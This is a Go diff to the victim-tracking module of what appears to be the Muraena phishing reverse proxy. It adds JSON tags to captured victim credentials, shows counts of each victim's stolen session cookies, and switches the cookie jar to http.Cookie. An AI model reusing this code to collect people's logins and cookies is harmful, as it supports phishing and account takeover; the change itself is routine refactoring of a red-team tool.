@@ -1,17 +1,16 @@
 package tracking
 
 import (
-	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
 	"strconv"
 	"sync"
 	"time"
 
-	"github.com/muraenateam/muraena/log"
-	"github.com/muraenateam/muraena/module/necrobrowser"
-
 	"github.com/evilsocket/islazy/tui"
+
+	"github.com/muraenateam/muraena/log"
 )
 
 // Victim identifies a User-Agent being tracked
@@ -36,9 +35,9 @@ type Victim struct {
 
 // VictimCredentials structure
 type VictimCredentials struct {
-	Key   string
-	Value string
-	Time  time.Time
+	Key   string    `json:"key"`
+	Value string    `json:"value"`
+	Time  time.Time `json:"time"`
 }
 
 // GetVictim returns a victim
@@ -95,9 +94,9 @@ func (module *Tracker) ShowVictims() {
 		"ID",
 		"IP",
 		"UA",
-		"# Credentials",
-		"# Requests",
-		"Cookie Jar",
+		"Credentials",
+		"Requests",
+		"Cookies",
 	}
 
 	var rows [][]string
@@ -105,22 +104,20 @@ func (module *Tracker) ShowVictims() {
 		_, vv := k.(string), v.(*Victim)
 
 		if len(vv.Credentials) > 0 {
-
-
-			m := map[string]interface{}{}
-			vv.Cookies.Range(func(key, value interface{}) bool {
-				m[fmt.Sprint(key)] = value
+			cookies := 0
+			vv.Cookies.Range(func(_, _ interface{}) bool {
+				cookies++
 				return true
 			})
 
-			b, err := json.MarshalIndent(m, "", " ")
-			if err != nil {
-				module.Error("%+v", err)
-				b = []byte{}
-			}
-
-			rows = append(rows, []string{tui.Bold(vv.ID), vv.IP, vv.UA, strconv.Itoa(len(vv.Credentials)),
-				strconv.Itoa(vv.RequestCount), string(b)})
+			rows = append(rows,
+				[]string{tui.Bold(vv.ID),
+					vv.IP,
+					vv.UA,
+					strconv.Itoa(len(vv.Credentials)),
+					strconv.Itoa(vv.RequestCount),
+					strconv.Itoa(cookies),
+				})
 		}
 		return true
 	})
@@ -138,8 +135,7 @@ func (module *Tracker) Push(v *Victim) {
 	}
 }
 
-func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCookie) {
-
+func (module *Tracker) AddToCookieJar(v *Victim, cookie http.Cookie) {
 	if cookie.Domain == module.Session.Config.Proxy.Phishing {
 		return
 	}
@@ -153,9 +149,5 @@ func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCook
 	victim := vv.(*Victim)
 	cookieKey := fmt.Sprintf("%s_%s_%s", cookie.Name, cookie.Path, cookie.Domain)
 	victim.Cookies.Store(cookieKey, cookie)
-
-	//module.Info("[%s] New cookie %s:%s [%s] (key: %s)", victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Value),
-	//	tui.Bold(cookie.Domain), tui.Red(cookieKey))
-
 	module.Victims.Store(victim.ID, victim)
 }
